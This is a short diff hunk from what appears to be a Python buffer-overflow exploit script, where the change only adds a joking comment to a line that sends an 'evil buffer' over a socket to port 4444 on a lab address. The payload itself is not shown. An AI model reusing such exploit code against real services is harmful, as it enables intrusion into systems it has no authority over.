@@ -90,6 +90,6 @@ try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(('192.168.1.215', 4444))
 	print('[+] Sending %s bytes of evil buffer..' %len(buffer))
-	s.send(buffer.encode())
+	s.send(buffer.encode())        # Limit the number of allowed characters for fun :D
 except Exception as e:
 	print(e)
